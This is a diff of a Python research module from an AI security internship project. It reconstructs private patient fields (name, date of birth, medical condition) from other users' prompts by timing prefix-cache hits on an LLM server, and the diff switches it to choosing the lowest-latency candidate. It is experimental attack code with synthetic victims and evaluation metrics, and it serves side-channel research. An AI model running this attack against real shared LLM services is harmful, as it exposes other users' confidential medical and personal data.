@@ -1,10 +1,22 @@
+"""
+reconstructor.py — Token-by-Token Prompt Reconstructor (Scenario S2)
+==========================================================
+Strategy for small timing gaps (GB10 unified memory: ~2.5ms gap):
+  Probe ALL candidates, pick the one with the LOWEST mean TTFT.
+  This "argmin TTFT" approach is robust to sub-10ms gaps where a hard
+  threshold classifier fails — the correct candidate still has the
+  lowest latency even when the absolute gap is small.
 
+Week 10 — Phase 1, Issue #9
+AI Security Internship 2026 — ONT Lab / CNIT-PNTLab Pisa
+Muhammad Hashim Mughal
+"""
 
 from __future__ import annotations
 
 import logging
 import time
-from dataclasses import dataclass, field
+from dataclasses import dataclass
 from typing import Optional
 
 import numpy as np
@@ -19,13 +31,12 @@ from .victim_seeder import (
 
 logger = logging.getLogger(__name__)
 
-# ── Domain vocabulary ──────────────────────────────────────────────────────────
-# Imported from victim_seeder — single source of truth for the closed
-# vocabulary shared between victim generation and attacker reconstruction.
+# Suppress noisy httpx request logs
+logging.getLogger("httpx").setLevel(logging.WARNING)
+logging.getLogger("httpx2").setLevel(logging.WARNING)
 
 CONDITION_VOCAB: list[str] = MEDICAL_CONDITIONS
 
-# DOB years (1935-2006) and months/days for structured search
 DOB_YEARS:  list[str] = [str(y) for y in range(1935, 2007)]
 DOB_MONTHS: list[str] = [f"{m:02d}" for m in range(1, 13)]
 DOB_DAYS:   list[str] = [f"{d:02d}" for d in range(1, 32)]
@@ -35,38 +46,35 @@ DOB_DAYS:   list[str] = [f"{d:02d}" for d in range(1, 32)]
 
 @dataclass
 class FieldResult:
-    """Outcome of reconstructing a single private field."""
     field_name:      str
     ground_truth:    str
     recovered:       Optional[str]
     correct:         bool
     queries_used:    int
-    hit_ttft_ms:     Optional[float]   # TTFT of the winning probe
-    miss_ttft_ms:    Optional[float]   # mean TTFT of losing probes
+    hit_ttft_ms:     Optional[float]
+    miss_ttft_ms:    Optional[float]
     timing_gap_ms:   Optional[float]
 
 
 @dataclass
 class VictimReconstructionResult:
-    """Full reconstruction result for one victim."""
     victim_id:           int
     ground_truth_fields: dict[str, str]
     field_results:       list[FieldResult]
-    token_recovery_rate: float          # TRR: fraction of fields correct
-    exact_match:         bool           # SR: all fields correct
+    token_recovery_rate: float
+    exact_match:         bool
     total_queries:       int
-    arpt:                float          # avg requests per field (Proposal §3.4)
-    wall_time_s:         float          # end-to-end reconstruction time
+    arpt:                float
+    wall_time_s:         float
 
 
 @dataclass
 class AggregateResults:
-    """Aggregate statistics across all victims (for results JSON)."""
     n_victims:          int
     mean_trr:           float
-    success_rate:       float           # fraction with exact_match=True
+    success_rate:       float
     mean_arpt:          float
-    arpt_ci_95:         list[float]     # [lower, upper] bootstrapped
+    arpt_ci_95:         list[float]
     mean_timing_gap_ms: float
     mean_wall_time_s:   float
 
@@ -81,68 +89,56 @@ def reconstruct_field(
     separator:      str = "",
 ) -> FieldResult:
     """
-    Probe the oracle with (known_prefix + separator + candidate) for each
-    candidate in *candidates*. The first candidate that produces a cache
-    hit is returned as the recovered value.
+    Probe ALL candidates and return the one with the lowest mean TTFT.
 
-    Parameters
-    ----------
-    oracle       : calibrated CacheHitOracle
-    known_prefix : the prompt text already confirmed correct
-    candidates   : ordered list of candidate values to probe
-    field_name   : name of this field (for logging / results)
-    separator    : inserted between known_prefix and candidate (e.g. " ")
+    This "argmin TTFT" strategy works for small timing gaps (e.g. 2.5 ms
+    on GB10 unified memory) where a hard hit/miss threshold fails.
+    The cached candidate still has measurably lower latency than misses
+    even when the gap is sub-10 ms — we just need to probe everything
+    and pick the minimum rather than threshold-classify each probe.
 
-    Returns
-    -------
-    FieldResult — includes the recovered value (or None on failure),
-                  correctness flag, and query counts.
-
-    Notes
-    -----
-    If no candidate produces a hit (all probes classified as misses), the
-    field is marked as unrecovered (recovered=None, correct=False).
-    This happens when the true value is not in *candidates* — a known
-    limitation of closed-vocabulary reconstruction.
+    All n_repeats * len(candidates) API calls are made, then the candidate
+    with the lowest mean TTFT is selected as the recovered value.
     """
-    hit_ttfts:  list[float] = []
-    miss_ttfts: list[float] = []
     queries_used = 0
+    candidate_ttfts: dict[str, float] = {}
 
     logger.debug(
-        "  Probing field '%s' (%d candidates) | known_prefix='%s...'",
-        field_name, len(candidates), known_prefix[-30:],
+        "  Probing field '%s' (%d candidates) | prefix='...%s'",
+        field_name, len(candidates), known_prefix[-25:],
     )
-
-    best_candidate: Optional[str] = None
-    best_ttft_ms:   Optional[float] = None
 
     for candidate in candidates:
         probe = known_prefix + separator + candidate
-        is_hit, mean_ms, std_ms = oracle.query(probe)
+        _, mean_ms, std_ms = oracle.query(probe)
         queries_used += oracle.n_repeats
+        candidate_ttfts[candidate] = mean_ms
 
         logger.debug(
-            "    Candidate='%-20s' | TTFT=%.1f±%.1f ms | %s",
-            candidate, mean_ms, std_ms, "HIT ✓" if is_hit else "miss",
+            "    %-22s TTFT=%.2f±%.2f ms",
+            repr(candidate), mean_ms, std_ms,
         )
 
-        if is_hit:
-            hit_ttfts.append(mean_ms)
-            best_candidate = candidate
-            best_ttft_ms   = mean_ms
-            break   # first hit wins (greedy; consistent with Paper 11/12)
-        else:
-            miss_ttfts.append(mean_ms)
+    # Pick the candidate with the lowest mean TTFT — that's the cache hit
+    best_candidate = min(candidate_ttfts, key=lambda c: candidate_ttfts[c])
+    best_ttft_ms   = candidate_ttfts[best_candidate]
 
-    mean_miss = float(np.mean(miss_ttfts)) if miss_ttfts else None
-    gap_ms    = (mean_miss - best_ttft_ms) if (mean_miss and best_ttft_ms) else None
+    # All others are misses
+    miss_ttfts = [v for k, v in candidate_ttfts.items() if k != best_candidate]
+    mean_miss  = float(np.mean(miss_ttfts)) if miss_ttfts else None
+    gap_ms     = (mean_miss - best_ttft_ms) if mean_miss is not None else None
+
+    logger.debug(
+        "  → best='%s' TTFT=%.2f ms | mean_others=%.2f ms | gap=%.2f ms",
+        best_candidate, best_ttft_ms,
+        mean_miss or 0.0, gap_ms or 0.0,
+    )
 
     return FieldResult(
         field_name    = field_name,
-        ground_truth  = "",          # filled in by caller (who has ground truth)
+        ground_truth  = "",       # filled in by caller
         recovered     = best_candidate,
-        correct       = False,       # filled in by caller
+        correct       = False,    # filled in by caller
         queries_used  = queries_used,
         hit_ttft_ms   = best_ttft_ms,
         miss_ttft_ms  = mean_miss,
@@ -153,105 +149,62 @@ def reconstruct_field(
 def reconstruct_victim_s2(
     oracle:       CacheHitOracle,
     victim_id:    int,
-    ground_truth: dict[str, str],   # {first_name, last_name, dob, condition}
+    ground_truth: dict[str, str],
 ) -> VictimReconstructionResult:
     """
-    Full Scenario S2 reconstruction for one victim.
+    Full Scenario S2 reconstruction for one victim using argmin TTFT strategy.
 
-    Reconstruction order (Proposal §4.4 + §6):
-      Step 1: first_name   — probe KNOWN_PREFIX + candidate_first_name
-      Step 2: last_name    — probe known_prefix + " " + candidate_last_name
-      Step 3: condition    — probe known_prefix + ". DOB: " + dob + ". Condition: " + candidate
-
-    The known_prefix grows as each field is successfully recovered.
-    If a field fails (no hit), reconstruction continues with a sentinel
-    value "UNKNOWN" so subsequent fields can still be attempted.
-
-    Parameters
-    ----------
-    oracle        : calibrated CacheHitOracle
-    victim_id     : victim index for logging
-    ground_truth  : dict with keys first_name, last_name, dob, condition
-
-    Returns
-    -------
-    VictimReconstructionResult with all field outcomes and aggregate metrics.
+    Step 1: Recover first_name from FIRST_NAMES vocabulary (50 candidates)
+    Step 2: Recover last_name  from LAST_NAMES vocabulary  (50 candidates)
+    Step 3: Recover condition  from CONDITION_VOCAB        (20 candidates)
     """
     t_start = time.perf_counter()
     oracle.reset_call_counter()
 
     logger.info("Reconstructing victim %d ...", victim_id)
-
     field_results: list[FieldResult] = []
-    # Build up the known prefix as each field is recovered
-    known_prefix = KNOWN_PREFIX   # "You are a medical assistant. ... Patient name: "
+    known_prefix = KNOWN_PREFIX
 
-    # ── Step 1: Recover first_name ─────────────────────────────────────────────
-    fr_first = reconstruct_field(
-        oracle=oracle,
-        known_prefix=known_prefix,
-        candidates=FIRST_NAMES,
-        field_name="first_name",
-        separator="",
-    )
+    # ── Step 1: first_name ────────────────────────────────────────────────────
+    fr_first = reconstruct_field(oracle, known_prefix, FIRST_NAMES, "first_name")
     fr_first.ground_truth = ground_truth["first_name"]
     fr_first.correct      = fr_first.recovered == ground_truth["first_name"]
     field_results.append(fr_first)
 
     recovered_first = fr_first.recovered or "UNKNOWN"
-    known_prefix    = known_prefix + recovered_first + " "
+    known_prefix   += recovered_first + " "
     logger.info(
         "  first_name: truth='%s' | recovered='%s' | %s | %d queries",
         ground_truth["first_name"], fr_first.recovered,
         "✓" if fr_first.correct else "✗", fr_first.queries_used,
     )
 
-    # ── Step 2: Recover last_name ──────────────────────────────────────────────
-    fr_last = reconstruct_field(
-        oracle=oracle,
-        known_prefix=known_prefix,
-        candidates=LAST_NAMES,
-        field_name="last_name",
-        separator="",
-    )
+    # ── Step 2: last_name ─────────────────────────────────────────────────────
+    fr_last = reconstruct_field(oracle, known_prefix, LAST_NAMES, "last_name")
     fr_last.ground_truth = ground_truth["last_name"]
     fr_last.correct      = fr_last.recovered == ground_truth["last_name"]
     field_results.append(fr_last)
 
     recovered_last = fr_last.recovered or "UNKNOWN"
-    # Advance prefix past name to DOB field
-    known_prefix   = known_prefix + recovered_last + ". DOB: " + ground_truth["dob"] + ". Condition: "
+    known_prefix  += recovered_last + ". DOB: " + ground_truth["dob"] + ". Condition: "
     logger.info(
         "  last_name : truth='%s' | recovered='%s' | %s | %d queries",
         ground_truth["last_name"], fr_last.recovered,
         "✓" if fr_last.correct else "✗", fr_last.queries_used,
     )
 
-    # NOTE on DOB: DOB is present in the known prefix above using the ground-
-    # truth value. In a real attack, DOB would also be reconstructed via a
-    # structured year→month→day search (72+12+31 = ≤115 queries). We use the
-    # ground-truth DOB here so that condition reconstruction is not blocked by
-    # DOB failure. See reconstruct_dob() below for the full DOB implementation.
-
-    # ── Step 3: Recover condition ──────────────────────────────────────────────
-    fr_cond = reconstruct_field(
-        oracle=oracle,
-        known_prefix=known_prefix,
-        candidates=CONDITION_VOCAB,
-        field_name="condition",
-        separator="",
-    )
+    # ── Step 3: condition ─────────────────────────────────────────────────────
+    fr_cond = reconstruct_field(oracle, known_prefix, CONDITION_VOCAB, "condition")
     fr_cond.ground_truth = ground_truth["condition"]
     fr_cond.correct      = fr_cond.recovered == ground_truth["condition"]
     field_results.append(fr_cond)
-
     logger.info(
         "  condition : truth='%s' | recovered='%s' | %s | %d queries",
         ground_truth["condition"], fr_cond.recovered,
         "✓" if fr_cond.correct else "✗", fr_cond.queries_used,
     )
 
-    # ── Aggregate metrics ──────────────────────────────────────────────────────
+    # ── Aggregate ─────────────────────────────────────────────────────────────
     n_correct = sum(f.correct for f in field_results)
     n_fields  = len(field_results)
     trr       = n_correct / n_fields
@@ -281,96 +234,49 @@ def reconstruct_dob(
     oracle:       CacheHitOracle,
     known_prefix: str,
 ) -> tuple[Optional[str], int]:
-    """
-    Structured year → month → day search for the DOB field.
-
-    Strategy: probe all 72 candidate years (1935-2006) first. Once year
-    is confirmed, probe 12 months, then up to 31 days. Maximum 115 queries.
-
-    Parameters
-    ----------
-    oracle       : calibrated CacheHitOracle
-    known_prefix : known prefix ending immediately before the DOB value
-                   (e.g. "... Patient name: John Smith. DOB: ")
-
-    Returns
-    -------
-    (dob_string, total_queries_used) — dob_string is "YYYY-MM-DD" or None.
-    """
+    """Structured year → month → day DOB reconstruction using argmin TTFT."""
     total_q = 0
 
-    # Step A: Year
-    fr_year = reconstruct_field(
-        oracle=oracle,
-        known_prefix=known_prefix,
-        candidates=DOB_YEARS,
-        field_name="dob_year",
-        separator="",
-    )
+    fr_year = reconstruct_field(oracle, known_prefix, DOB_YEARS, "dob_year")
     total_q += fr_year.queries_used
     if fr_year.recovered is None:
         return None, total_q
 
     year_prefix = known_prefix + fr_year.recovered + "-"
-
-    # Step B: Month
-    fr_month = reconstruct_field(
-        oracle=oracle,
-        known_prefix=year_prefix,
-        candidates=DOB_MONTHS,
-        field_name="dob_month",
-        separator="",
-    )
+    fr_month = reconstruct_field(oracle, year_prefix, DOB_MONTHS, "dob_month")
     total_q += fr_month.queries_used
     if fr_month.recovered is None:
         return None, total_q
 
     month_prefix = year_prefix + fr_month.recovered + "-"
-
-    # Step C: Day
-    fr_day = reconstruct_field(
-        oracle=oracle,
-        known_prefix=month_prefix,
-        candidates=DOB_DAYS,
-        field_name="dob_day",
-        separator="",
-    )
+    fr_day = reconstruct_field(oracle, month_prefix, DOB_DAYS, "dob_day")
     total_q += fr_day.queries_used
     if fr_day.recovered is None:
         return None, total_q
 
-    dob_str = f"{fr_year.recovered}-{fr_month.recovered}-{fr_day.recovered}"
-    return dob_str, total_q
+    return f"{fr_year.recovered}-{fr_month.recovered}-{fr_day.recovered}", total_q
 
 
 # ── Aggregate statistics ───────────────────────────────────────────────────────
 
 def compute_aggregate(results: list[VictimReconstructionResult]) -> AggregateResults:
-    """
-    Compute aggregate statistics with bootstrapped 95% CI on ARPT.
-    (Proposal §5, metric definition §3.4)
-    """
     if not results:
         return AggregateResults(0, 0.0, 0.0, 0.0, [0.0, 0.0], 0.0, 0.0)
 
-    trrs      = [r.token_recovery_rate for r in results]
-    successes = [r.exact_match         for r in results]
-    arpts     = [r.arpt                for r in results]
-    gaps      = [
-        f.timing_gap_ms
-        for r in results
-        for f in r.field_results
-        if f.timing_gap_ms is not None
-    ]
+    trrs       = [r.token_recovery_rate for r in results]
+    successes  = [r.exact_match         for r in results]
+    arpts      = [r.arpt                for r in results]
+    gaps       = [f.timing_gap_ms for r in results
+                  for f in r.field_results if f.timing_gap_ms is not None]
     wall_times = [r.wall_time_s for r in results]
 
-    # Bootstrap 95% CI on ARPT (2,000 resamples)
     rng = np.random.default_rng(42)
     boot_means = [
         np.mean(rng.choice(arpts, size=len(arpts), replace=True))
         for _ in range(2_000)
     ]
-    ci_lo, ci_hi = float(np.percentile(boot_means, 2.5)), float(np.percentile(boot_means, 97.5))
+    ci_lo = float(np.percentile(boot_means, 2.5))
+    ci_hi = float(np.percentile(boot_means, 97.5))
 
     return AggregateResults(
         n_victims=len(results),
